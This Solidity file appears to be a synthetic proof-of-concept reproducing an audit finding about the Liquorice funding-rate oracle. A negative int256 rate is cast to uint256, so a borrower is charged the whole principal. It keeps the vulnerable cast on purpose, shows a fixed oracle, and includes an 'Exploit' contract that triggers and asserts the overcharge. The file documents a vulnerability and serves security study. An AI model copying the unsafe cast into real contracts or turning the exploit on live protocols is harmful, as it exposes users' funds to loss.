// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Liquorice — FundingRateOracle casts a negative int256 rate to uint256
    (MixBytes). SYNTHETIC, cheatcode-free reduction.
    Root cause: getFundingRate returns uint256(rate). A funding rate of -1000
    becomes 2^256-1000, the interest model clamps that to 100%, and the borrower
    is charged the whole principal instead of no extra interest. Vulnerable cast
    preserved verbatim below (@> VULN). */

contract ERC20Mini {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        require(balanceOf[from] >= amt, "bal");
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract FundingRateConsumer {
    mapping(string => int256) public rates;

    function setRate(string memory ticker, int256 rate) external {
        rates[ticker] = rate;
    }
}

contract FundingRateOracle {
    FundingRateConsumer public consumer;
    mapping(address => string) public tickers;

    constructor(FundingRateConsumer consumer_) {
        consumer = consumer_;
    }

    function addAsset(address asset, string memory ticker) external {
        tickers[asset] = ticker;
    }

    function getFundingRate(address asset) external view returns (uint256) {
        int256 rate = consumer.rates(tickers[asset]);
        uint256 unsignedRate = uint256(rate); // @> VULN: a negative int256 cast to uint256 underflows to 2^256+rate
        // FIX: require(rate > type(int256).min) and do not cast a negative rate; floor it at 0 or keep it signed
        return unsignedRate;
    }
}

contract OracleFixed {
    FundingRateConsumer public consumer;
    mapping(address => string) public tickers;

    constructor(FundingRateConsumer consumer_) {
        consumer = consumer_;
    }

    function addAsset(address asset, string memory ticker) external {
        tickers[asset] = ticker;
    }

    function getFundingRate(address asset) external view returns (uint256) {
        int256 rate = consumer.rates(tickers[asset]);
        require(rate > type(int256).min, "min");
        if (rate < 0) return 0;
        return uint256(rate);
    }
}

contract Borrower {
    function approve(ERC20Mini token, address pool, uint256 amt) external {
        token.approve(pool, amt);
    }
}

contract LendingPool {
    ERC20Mini public token;
    FundingRateOracle public oracle;
    address public asset;
    uint256 public constant MAX_RATE = 1e18;

    constructor(ERC20Mini token_, FundingRateOracle oracle_, address asset_) {
        token = token_;
        oracle = oracle_;
        asset = asset_;
    }

    function charge(address borrower, uint256 principal) external returns (uint256 interest) {
        uint256 rate = oracle.getFundingRate(asset);
        if (rate > MAX_RATE) rate = MAX_RATE;
        interest = principal * rate / 1e18;
        require(token.transferFrom(borrower, address(this), interest), "charge"); // S5
    }
}

contract Exploit {
    ERC20Mini public token; // nonce 1
    FundingRateConsumer public consumer; // nonce 2
    FundingRateOracle public oracle; // nonce 3 — vulnerable cast
    LendingPool public pool; // nonce 4
    Borrower public borrower; // nonce 5
    address public constant ASSET = address(0xA55E7);
    string public constant TICKER = "TEST";
    uint256 public constant PRINCIPAL = 1000 ether;
    uint256 public rawRate;
    uint256 public charged;

    constructor() {
        token = new ERC20Mini();
        consumer = new FundingRateConsumer();
        oracle = new FundingRateOracle(consumer);
        pool = new LendingPool(token, oracle, ASSET);
        borrower = new Borrower();
        oracle.addAsset(ASSET, TICKER);
        token.mint(address(borrower), PRINCIPAL);
        borrower.approve(token, address(pool), type(uint256).max);
    }

    function run() external {
        consumer.setRate(TICKER, -1000); // S1
        rawRate = oracle.getFundingRate(ASSET); // S2
        pool.charge(address(borrower), PRINCIPAL); // S4
        charged = token.balanceOf(address(pool));
        require(rawRate == type(uint256).max - 999, "cast was not an underflow"); // S6
        require(charged == PRINCIPAL, "borrower was not charged the clamped max");
        require(token.balanceOf(address(borrower)) == 0, "borrower kept the principal");
    }
}
